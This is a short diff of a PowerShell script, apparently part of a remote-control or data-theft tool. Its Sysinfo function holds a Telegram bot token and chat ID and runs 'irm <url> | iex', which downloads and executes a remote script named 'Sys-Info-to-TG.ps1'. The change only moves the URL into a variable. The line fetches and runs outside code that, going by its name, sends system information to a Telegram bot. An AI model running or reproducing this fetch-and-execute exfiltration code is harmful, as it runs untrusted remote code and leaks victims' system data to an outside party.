@@ -439,7 +439,8 @@ Write-Output "$Value2"
 Function Sysinfo {
 $Token = "$tg"
 $ChatID = "$cid"
-irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-TG.ps1 | iex
+$url = "https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-TG.ps1"
+irm $url | iex
 Write-Output "Done."
 }
 
